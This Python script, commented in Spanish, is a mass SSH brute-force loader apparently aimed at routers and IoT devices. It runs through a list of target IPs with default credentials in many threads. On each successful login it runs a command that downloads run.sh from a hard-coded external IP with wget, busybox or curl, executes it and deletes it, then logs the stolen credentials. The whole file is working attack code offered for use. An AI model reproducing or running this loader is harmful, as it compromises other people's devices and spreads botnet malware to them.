import threading
import sys
import time
import queue
import paramiko
import socket

if len(sys.argv) < 4:
    print("Usage: python {} <list> <threads> <output file>".format(sys.argv[0]))
    sys.exit(1)

# Lista de combinaciones (usuario:contraseña)
combo = [
    "root:root",
    "root:",
    "admin:admin",
    "support:support",
    "user:user",
    "admin:",
    "admin:password",
    "root:vizxv",
    "root:admin",
    "root:xc3511",
    "root:888888",
    "root:xmhdipc",
    "root:default",
    "root:juantech",
    "root:123456",
    "root:54321",
    "root:12345",
    "root:pass",
    "ubnt:ubnt",
    "root:klv1234",
    "root:Zte521",
    "root:hi3518",
    "root:jvbzd",
    "root:anko",
    "root:zlxx.",
    "root:7ujMko0vizxv",
    "root:7ujMko0admin",
    "root:system",
    "root:ikwb",
    "root:dreambox",
    "root:user",
    "root:realtek",
    "root:00000000",
    "admin:1111111",
    "admin:1234",
    "admin:12345",
    "admin:54321",
    "admin:123456",
    "admin:7ujMko0admin",
    "admin:1234",
    "admin:pass",
    "admin:meinsm",
    "admin:admin1234",
    "root:1111",
    "admin:smcadmin",
    "admin:1111",
    "root:666666",
    "root:password",
    "root:1234",
    "root:klv123",
    "Administrator:admin",
    "service:service",
    "supervisor:supervisor",
    "guest:guest",
    "guest:12345",
    "guest:12345",
    "admin1:password",
    "administrator:1234",
    "666666:666666",
    "888888:888888",
    "tech:tech",
    "mother:fucker"
]

# Comando a enviar tras login exitoso (payload)
rekdevice = "cd /tmp; (wget -q -T 10 -t 3 -O run.sh http://189.140.120.209/run.sh || busybox wget -q -O run.sh http://189.140.120.209/run.sh || curl -s --connect-timeout 10 --retry 3 -o run.sh http://189.140.120.209/run.sh) && chmod +x run.sh && ./run.sh; rm -f run.sh"

# Colores ANSI para consola (funciona en Windows 10/11 con soporte)
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Conjunto global para evitar duplicados
success_set = set()
set_lock = threading.Lock()

def load_previous_successes(filename):
    """Carga los éxitos anteriores del archivo para evitar duplicados."""
    try:
        with open(filename, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    success_set.add(line)
        print(f"{CYAN}[*] Cargados {len(success_set)} éxitos previos{RESET}")
    except FileNotFoundError:
        pass

def ssh_connect(ip, port, user, passwd, timeout=5):
    """Intenta conexión SSH con credenciales."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port, username=user, password=passwd, timeout=timeout)
        return client
    except (paramiko.AuthenticationException, paramiko.SSHException, socket.error, Exception):
        return None

def exec_command(client, cmd):
    """Ejecuta comando remoto y devuelve salida (bytes)."""
    stdin, stdout, stderr = client.exec_command(cmd)
    return stdout.read() + stderr.read()

def log_success(ip, port, user, passwd, filename):
    """Escribe éxito en archivo."""
    with open(filename, "a") as f:
        f.write(f"{ip}:{port} {user}:{passwd}\n")

class RouterThread(threading.Thread):
    def __init__(self, ip, output_file):
        super().__init__()
        self.ip = ip.rstrip('\n')
        self.output_file = output_file

    def run(self):
        for cred in combo:
            parts = cred.split(":", 1)
            if len(parts) != 2:
                continue
            user, passwd = parts[0], parts[1]

            # Intentar conexión SSH
            client = ssh_connect(self.ip, 22, user, passwd, timeout=5)
            if client is None:
                continue

            # Autenticación exitosa
            print(f"{GREEN}[+] Autenticación exitosa: {user}:{passwd} @ {self.ip}{RESET}")

            # Ejecutar comando remoto
            try:
                output = exec_command(client, rekdevice).decode('utf-8', errors='ignore')
                client.close()

                # Si el comando se ejecutó (no lanzó excepción), consideramos éxito
                key = f"{self.ip}:22 {user}:{passwd}"
                with set_lock:
                    if key not in success_set:
                        success_set.add(key)
                        log_success(self.ip, 22, user, passwd, self.output_file)
                        print(f"{GREEN}[+] Payload enviado a {self.ip} con {user}:{passwd}{RESET}")
                        if output.strip():
                            print(f"    Salida: {output.strip()}")
                    else:
                        print(f"{YELLOW}[!] Éxito ya registrado, omitiendo duplicado{RESET}")
                break  # Salir del bucle de combos para esta IP

            except Exception as e:
                print(f"{RED}[-] Error ejecutando comando en {self.ip}: {e}{RESET}")
                client.close()
                continue

def worker(q, output_file):
    while True:
        try:
            ip = q.get(timeout=1)
        except queue.Empty:
            break
        t = RouterThread(ip, output_file)
        t.start()
        q.task_done()
        time.sleep(0.02)  # Pequeña pausa

def main():
    # Leer IPs
    with open(sys.argv[1], "r") as f:
        ips = [line.strip() for line in f if line.strip()]

    threads_count = int(sys.argv[2])
    output_file = sys.argv[3]

    # Cargar éxitos previos
    load_previous_successes(output_file)

    # Crear cola
    q = queue.Queue()
    for ip in ips:
        q.put(ip)

    print(f"{CYAN}[*] {q.qsize()} IPs en cola. Lanzando {threads_count} workers...{RESET}")
    workers = []
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(q, output_file))
        t.start()
        workers.append(t)

    for t in workers:
        t.join()

    print(f"{CYAN}[*] Proceso terminado.{RESET}")

if __name__ == "__main__":
    main()